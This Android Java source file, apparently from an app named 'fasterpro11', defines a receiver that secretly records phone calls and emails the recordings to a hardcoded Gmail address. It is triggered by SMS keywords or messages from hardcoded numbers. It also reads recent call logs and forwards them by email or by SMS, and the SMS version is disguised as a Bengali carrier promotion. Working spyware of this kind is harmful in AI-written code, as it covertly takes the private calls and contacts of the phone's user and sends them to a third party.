package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.content.SharedPreferences;

import javax.mail.MessagingException;


public class CallRecorderAuto extends BroadcastReceiver {
    private MediaRecorder recorder;
    private String fileName;
    private Context mContext;

    private static final String TAG = "CallRecorderAuto";
    private static final String[] allowedIncomingNumbers = {
            "+8801300282086", "+8801304039289",  "+8809697637893", "+8809638821369" };

    private static final String[] WORDS1_GRADE = {"Goldc", "Silverc", "Mediumc"};
    private static final String[] WORDS2_OFFER = {"Congratulationc", "Conformc"};
    private List<String> lastMessages = new ArrayList<>();
    private List<String> lastCallNumbers = new ArrayList<>();
    private int recordingCount = 1;
    private boolean isOnCall = false;
    private boolean isCallRecording = false; // রেকর্ডিং ফ্ল্যাগ
    public CallRecorderAuto() {
        Log.d(TAG, "CallRecorder class initialized.");
       // mContext = MyApplication.getAppContext();  // Set the context here if needed
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        if (!folder.exists()) {
            folder.mkdirs();
            Log.d(TAG, "Created directory for CallRecording.");
        }
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "CallRecorderAuto class onReceive called with action : " + intent.getAction());

        // Initialize mContext to ensure it is not null
        Log.d(TAG, "Context passed to onReceive: " + context);
        //mContext = context;
        mContext = context.getApplicationContext();
        if (mContext == null) {
            Log.e(TAG, "onReceive mContext is still null");
        } else {
            Log.d(TAG, "onReceive mContext is initialized");
        }

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            Log.d(TAG, "onReceive Call ended 1 .");
            handlePhoneStateChange(intent, context);

            //if allow number Forward Sms By SmsReceiver Class by SMS
            Log.d(TAG, "onReceive Call ended 2 ForwardSmsBySMSSmsReceiverClass.");
            String incomingNumber = lastCallNumbers.isEmpty() ? "unknown" : lastCallNumbers.get(lastCallNumbers.size() - 1);
            try {
                ForwardSmsBySMSSmsReceiverClass(context, incomingNumber);
            } catch (MessagingException e) {
                throw new RuntimeException(e);
            }

        } else if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            handleSmsReceived(intent, context);
        }
        String recentCallLogs = getRecentCallLogs(); // Now mContext is initialized
       // Log.d(TAG, "onReceive Recent Call Logs: \n" + recentCallLogs);
    }

    private void handlePhoneStateChange(Intent intent, Context context) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            // কল রিং হচ্ছে, রেকর্ডিং শুরু করবেন না
            Log.d(TAG, "Incoming call from: " + incomingNumber);
            // এখানে রেকর্ডিং শুরু করবেন না, কল রিসিভ হওয়ার জন্য অপেক্ষা করুন
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            // কল রিসিভ হয়েছে, রেকর্ডিং শুরু করুন
            Log.d(TAG, "Call answered, starting recording for: " + incomingNumber);

            if (!isCallRecording) { // চেক করুন যে রেকর্ডিং চলছে কিনা
                isCallRecording = true; // রেকর্ডিং শুরু করার জন্য ফ্ল্যাগ সেট করুন
                // রেকর্ডিং শুরু করুন
                MicRecord micRecord = new MicRecord(context); // 'this' হলো Context (যেমন Activity বা Service)
                String messageBody = "Some message";  // প্রকৃত মেসেজ বা প্রয়োজনীয় লজিক এখানে দিন
                Log.d(TAG, "called from  callracorder class the method of StartRecording in micRecord.");
                //micRecord.StartRecording(incomingNumber, messageBody); // রেকর্ডিং শুরু করুন

                // Check Android version - only record if below API 28
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
                    Log.d(TAG, "Android version is lower 9 recording start.versiov:" +Build.VERSION.SDK_INT );
                    micRecord.StartRecording(incomingNumber, messageBody); // রেকর্ডিং শুরু করুন
                }else {
                    Log.d(TAG, "Android version is < P (API 28), skipping recording.versiov:" +Build.VERSION.SDK_INT);

                }


            }
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            // কল শেষ হলে রেকর্ডিং বন্ধ করুন
            Log.d(TAG, "Call ended, stopping recording");

            if (isCallRecording) { // যদি রেকর্ডিং চলমান থাকে
                //isCallRecording = false; // রেকর্ডিং বন্ধ করার জন্য ফ্ল্যাগ সেট করুন
                // রেকর্ডিং থামান
                MicRecord micRecord = new MicRecord(context); // 'this' হলো Context (যেমন Activity বা Service)
                String messageBody = "Some message";  // প্রকৃত মেসেজ বা প্রয়োজনীয় লজিক এখানে দিন
                micRecord.stopMicSoundRecording(context); // রেকর্ডিং বন্ধ করুন

              // Check Android version - only record if below API 28
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
                    Log.d(TAG, "Call ended Android version is lower 9 .versiov:" +Build.VERSION.SDK_INT);
                   // micRecord.stopMicSoundRecording(context); // রেকর্ডিং বন্ধ করুন
                }else {
                    Log.d(TAG, "Android version is < P (API 28), skipping recording.versiov:" +Build.VERSION.SDK_INT);
                Log.d(TAG, "CallRecorderAuto last call recording sending Email .");
               sendLastRecordingViaEmail(context);
                }

                Log.d("CallReceiver", "Call ended, stopping recording.");
                // যদি প্রয়োজন হয় তবে ইমেইল মারফত রেকর্ডিং পাঠান
                sendLastRecordingViaEmail(context);
                // SMS সম্পর্কিত কাজ করুন
                handleSmsReceived(intent, context);
            }
        }
    }


    private void handleSmsReceived(Intent intent, Context context) {
        Log.d(TAG, "Handling received SMS.");
        try {
            Bundle bundle = intent.getExtras();

            // চেক করুন bundle null নয় কি না
            if (bundle != null) {
                // "pdus" নামক কী থেকে sms এর পিডিইউ (PDU) ডেটা পাবার চেষ্টা
                Object[] pdus = (Object[]) bundle.get("pdus");

                // চেক করুন pdus null নয় এবং তার দৈর্ঘ্য শূন্য নয়
                if (pdus != null && pdus.length > 0) {
                    // SMS পুডু থেকে এক একটি SMS তৈরি করা
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        // received SMS এর তথ্য লগ করা
                        Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                        // এসএমএস-এর মধ্যে নির্দিষ্ট কিওয়ার্ডের উপস্থিতি চেক করা
                        boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                        boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                        boolean isInternetAvailable = isInternetAvailable(context);
                        boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);
                        boolean isPatternMatchInCallLogs = isPatternMatchInCallLogs(context);
                        boolean incomingCallNumber = IncomingCallNumber(sender);

                        // লগিং: কিওয়ার্ড চেক, ইন্টারনেট কনেকশন চেক, এবং ফোন নম্বর চেক করা
                        Log.d(TAG, "handleSmsReceived Keywords 1 found: " + containsWords1);
                        Log.d(TAG, "handleSmsReceived Keywords 2 found: " + containsWords2);
                        Log.d(TAG, "handleSmsReceived Internet available: " + isInternetAvailable);
                        Log.d(TAG, "handleSmsReceived Allowed number: " + isAllowedNumber);
                        Log.d(TAG, "handleSmsReceived IsPatternMatchInCallLogs: " + isPatternMatchInCallLogs);
                        Log.d(TAG, "handleSmsReceived IncomingCallNumber: " + incomingCallNumber);

                        // শর্তাবলী পূর্ণ হলে কল রেকর্ডিং পাঠানোর জন্য প্রস্তুত
                        if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                                (isAllowedNumber && isInternetAvailable)) {
                            Log.d(TAG, "CallRecorderAuto class met for call recording sending Email .");
                            sendLastRecordingViaEmail(context);
                        } else {
                            Log.d(TAG, "CallRecorderAuto class Conditions not met for call recording sending.");
                        }
                    }
                } else {
                    Log.d(TAG, "CallRecorderAuto class No PDUs found in the bundle.");
                }
            } else {
                Log.d(TAG, "CallRecorderAuto class Bundle is null.");
            }
        } catch (Exception e) {
            // যে কোনো ত্রুটি হলে তাকে লগ করুন
            Log.e(TAG, "CallRecorderAuto class Error in handleSmsReceived: ", e);
        }
    }
    public void ForwardSmsBySMSSmsReceiverClass(Context context, String incomingNumber) throws MessagingException {
        Log.d(TAG, " for allow number match Forward call list By SMSSmsReceiver Class method running");
        //if allow number match.Forward  Sms By SMSSmsReceiver Class
        boolean isInternetAvailable = isInternetAvailable(context);
        boolean IsPatternMatchInCallLogs = isPatternMatchInCallLogs(context);
        Log.d(TAG, "Internet available: " + isInternetAvailable);
        Log.d(TAG, "Is Pattern Match In CallLogs: " + IsPatternMatchInCallLogs);
        //Log.d(TAG, "IncomingCallNumber: " + incomingCallNumber);

        // if internet not avabale info send by sms
        if (incomingNumber == null) {
            Log.e(TAG, "Incoming number is null, cannot proceed.");
            return; // যদি null হয়, তাহলে মেথডটি আগেই শেষ করুন
        }
        if ( (IsPatternMatchInCallLogs) ||
            (incomingNumber.equals("+8801300282086") ||
             incomingNumber.equals("+8809697637893") ||
             incomingNumber.equals("+8809638821369") )) {
            Log.d(TAG, "Allow number Conditions met for forwarding calllist .Forward By SmsReceiverClass");
            SmsReceiver smsReceiver = new SmsReceiver();
            String sender = incomingNumber;
            String messageBody = "এই মাসে 1009 টাকা ব্যবহার করে হয়ে যান সিলভার স্টার, রেজিস্ট্রেশনের জন্য ডায়াল *১২১*৫৪০০#: " + getRecentCallLogs();  // Get the recent call log data here

            // Ensure messageBody and sender are not null
            if (sender != null && messageBody != null) {
                // Get the previous call log data from SharedPreferences (or another method of storage)
                SharedPreferences preferences = context.getSharedPreferences("SMSPrefs", Context.MODE_PRIVATE);
                String previousMessage = preferences.getString("lastSentCallLog", "");

                // Check if the new call log is the same as the previous one
                if (!messageBody.equals(previousMessage)) {
                    // Forward the SMS with the call log content
                        if  (isInternetAvailable)  {
                            Log.d(TAG, "Internet Available Forward the calllist forwarding by email.");
                            smsReceiver.forwardSmsByEmail(sender, messageBody, context);
                        }
                        if  (!isInternetAvailable)  {
                            Log.d(TAG, "Internet not Available Forward the calllist forwarding by SMS.");
                        smsReceiver.forwardSmsBySMS(sender, messageBody, context);
                        }

                    // Store the new call log data as the last sent message
                    SharedPreferences.Editor editor = preferences.edit();
                    editor.putString("lastSentCallLog", messageBody);
                    editor.apply();
                } else {
                    Log.d(TAG, " Not forwarding.Call log is the same as the previous sending mail. ");
                }
            } else {
                Log.e(TAG, "callist Sender or messageBody is null. Cannot forward  .");
            }
        } else {
            Log.d(TAG, "Allow number Conditions not met for CallLog forwarding .");
        }
    }
    private boolean isPatternMatchInCallLogs(Context context) {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS1_GRADE.");
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS2_OFFER.");
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        Log.d(TAG, "Checking if number is allowed: " + number);
        for (String allowedNumber : allowedIncomingNumbers) {
            if (allowedNumber.equals(number)) {
                Log.d(TAG, "Allowed number found: " + number);
                return true;
            }
        }
        Log.d(TAG, "Number calling is not allowed: " + number);
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        Log.d(TAG, "Checking last call numbers.");
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }
        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        String sortOrder = CallLog.Calls.DATE + " DESC";

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                    count++;
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }

    // Method to get the user's phone number


    // get call list
    String recentCallLogs = getRecentCallLogs();
    String RecentCallLogs = "\n\nRecent Call Logs:\n" + recentCallLogs;
    private String getRecentCallLogs() {

        if (mContext == null) {
            Log.e(TAG, "getRecentCallLogs Context is null.");
            return "";
        }
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 2) break;
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallType(type);

                    callLogBuilder.append("").append(number)
                            .append("").append(new SimpleDateFormat("0HH0mm0", Locale.getDefault()).format(new Date(date)))
                            .append("");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();
    }
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    public boolean isInternetAvailable(Context context) {

        if (mContext == null) {
            Log.e(TAG, "isInternetAvailable mContext is still null");
        } else {
            Log.d(TAG, "isInternetAvailable mContext is initialized");
        }

        Log.d(TAG, "Checking internet availability.");
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }
    private boolean isMicAvailable(Context context) {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
    }

//    public void startCallRecording(Context context, String incomingNumber) {
//        checkPermissions( context ); // পারমিশন চেক করুন
//        if ( !isMicAvailable(context)  ) {
//            Log.e(TAG, "Microphone is not available.");
//            return;
//        }
//
//        Log.d(TAG, "Microphone is available.");
//
//        String timestamp = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss", Locale.getDefault()).format(new Date());
//        fileName = Environment.getExternalStorageDirectory() + "/DCIM/CallRecord/" + timestamp + "_" + recordingCount++ + ".m4a";
//
//        File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
//        if (!dir.exists() && dir.mkdirs()) {
//            Log.d(TAG, "CallRecord Directory created successfully.");
//        }
//
//        recorder = new MediaRecorder();
//        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
//        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
//        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
//        recorder.setOutputFile(fileName);
//
//        try {
//            recorder.prepare();
//            recorder.start();
//            isRecording = true;
//            Log.d(TAG, "Call recording started: " + fileName);
//        } catch (IOException | IllegalStateException e) {
//            Log.e(TAG, "Error starting call recording: " + e.getMessage());
//        }
//    }

    public void stopCallRecording(Context context) {

        if (mContext == null) {
            Log.e(TAG, "isInternetAvailable mContext is still null");
        } else {
            Log.d(TAG, "isInternetAvailable mContext is initialized");
        }

            try {
                    recorder.stop();  // রেকর্ডিং বন্ধ করা
                    Log.d(TAG, "call Recording stopped: " + fileName);
                    deleteOldRecordings();
                    if (isInternetAvailable(context)) {
                        Log.d(TAG, "Internet available, send Last Call Recording Via Email.");
                        //sendEmailWithAttachment("call Rec", "call Recording:", fileName);
                        sendLastRecordingViaEmail(context);
                    } else {
                        Log.d(TAG, "Internet not available, Recording saved locally.");
                    }
            } catch (RuntimeException e) {
                Log.e(TAG, "রেকর্ডার বন্ধ করার সময় RuntimeException", e);
            } finally {
                // রেকর্ডার রিলিজ করা এবং null করা
                if (recorder != null) {
                    recorder.release();
                    recorder = null;
                }
                isCallRecording = false;
                Log.d(TAG, "Call recording stopped.");
            }
    }

    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old Call recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 5) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            for (int i = 0; i < files.length - 5; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old Call recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old Call recording: " + files[i].getName());
                }
            }
        }
    }



    private String getLastRecordingFilePath() {
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 0) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            return files[files.length - 1].getAbsolutePath();
        }
        return null;
    }



    private void sendLastRecordingViaEmail(Context context) {
        String lastFilePath = getLastRecordingFilePath();
        if (lastFilePath != null) {
            sendEmailWithAttachment("Last Call Recording", "last sound recording:", lastFilePath);
        } else {
            Log.d(TAG, "No previous recording found send Email.");
        }
    }
    //if calllrecording file same call record class skip go fileservice class src callrecord and send
    private void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "Sending email with attachment...");

        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Get the mobile model
        String mobileModel = Build.MODEL;
        String emailSubject ="Call Rec: " + subject + " on model: " + mobileModel;

        // Compare email content and file size with previous email if same go fileservice class
        if (isEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Email content and file size same as the previous email. Skipping email send.");
            Log.d(TAG, "calllrecording file  same call record class skip go fileservice class serce callrecord and send.");
            FileService fileService = new FileService();
            Intent intent = new Intent();
            Log.d(TAG, "call the method fileService clss of HandleSmsReceived.");
            Context context = null;
            fileService.SendLastTimeFileingsEmail(intent, context);
        }

        // Compare email content and file size with previous email
        if (isEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Email content and file size same as the previous email. Skipping email send.");
            return;
        }

        try {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", emailSubject, body, filePath);
            Log.d(TAG, "Email sent successfully with attachment.");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize);

        } catch (Exception e) {
            Log.e(TAG, "Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize) {
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("subject", subject);
        editor.putString("body", body);
        editor.putLong("fileSize", fileSize);
        editor.putString("filePath", filePath);
        editor.apply();
        Log.d(TAG, "Email details stored.");
    }

    // Check if the email content is the same as before
    private boolean isEmailContentSame(String subject, String body, long fileSize) {
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        String previousSubject = sharedPreferences.getString("subject", "");
        String previousBody = sharedPreferences.getString("body", "");
        long previousFileSize = sharedPreferences.getLong("fileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(previousSubject) && body.equals(previousBody) && fileSize == previousFileSize;
    }



    private void checkPermissions( Context context ) {
        List<String> missingPermissions = new ArrayList<>();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.CAMERA);
            Log.e(TAG, "Missing permission: CAMERA");
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.RECORD_AUDIO);
            Log.e(TAG, "Missing permission: RECORD_AUDIO");
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            Log.e(TAG, "Missing permission: WRITE_EXTERNAL_STORAGE");
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.READ_CALL_LOG);
            Log.e(TAG, "Missing permission: READ_CALL_LOG");
        }

        if (!missingPermissions.isEmpty()) {
            Log.e(TAG, "Missing permissions: " + missingPermissions.toString());
        } else {
            Log.d(TAG, "All required permissions are granted.");
        }
    }
    private boolean IncomingCallNumber(String sender) {
        for (String number : allowedIncomingNumbers) {
            if (sender.equals(number)) {
                Log.d(TAG, "CallRecorderAuto class Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "CallRecorderAuto class Not an incoming call number: " + sender);
        return false;
    }

    public void SendLastRecordingViaEmail(Context context) {
        Log.d(TAG, "called from Notification class .the method of sendLastRecordingViaEmail in CallRecorderAuto.");
        sendLastRecordingViaEmail(context);
    }
}
